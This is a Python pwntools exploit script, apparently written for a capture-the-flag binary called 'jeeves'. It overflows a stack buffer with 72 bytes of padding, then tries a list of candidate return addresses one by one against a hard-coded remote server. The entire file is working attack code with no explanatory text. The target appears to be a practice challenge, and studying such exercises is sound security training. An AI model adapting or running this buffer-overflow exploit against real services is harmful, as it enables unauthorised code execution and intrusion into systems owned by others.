from pwn import *

elf = ELF("./jeeves")

offset = b"A" * 72
#fourbytes = b"AAAA"
jump = []
#p64(0x55555555523f, endian="little")
jump.append(0x55555555523f)
jump.append(0x555555555244)
jump.append(0x555555555249)
jump.append(0x55555555524d)
jump.append(0x555555555252)
jump.append(0x555555555259)
jump.append(0x55555555525e)
jump.append(0x555555555263)
jump.append(0x555555555266)
jump.append(0x55555555526a)
jump.append(0x55555555526d)
jump.append(0x555555555272)
jump.append(0x555555555275)
jump.append(0x555555555277)
jump.append(0x55555555527c)
jump.append(0x555555555281)
jump.append(0x555555555285)
jump.append(0x555555555288)
jump.append(0x55555555528f)
jump.append(0x555555555294)

serverip = "209.97.190.240"
port = 32153 
exploit = offset

server = remote(serverip, port)
#server = elf.process()
#server.sendlineafter("?", exploit)


for i in range(len(jump)):
    exploit = offset + p64(jump[i], endian="little")
    f = open('exploit.bin', 'wb')
    f.write(exploit)
    f.close()
    f = open('exploit.bin', 'rb')
    file_exploit = f.read()
    server.debug(exploit)
    print(server.buffer)
    server.sendline(file_exploit)
    print(server.buffer)
    #server.interactive()
    print(exploit)

    



#server = remote(serverip, port)
#server = elf.process()
#server.sendlineafter("?", exploit)
#server.sendline(exploit)
#server.interactive()
#print(exploit)
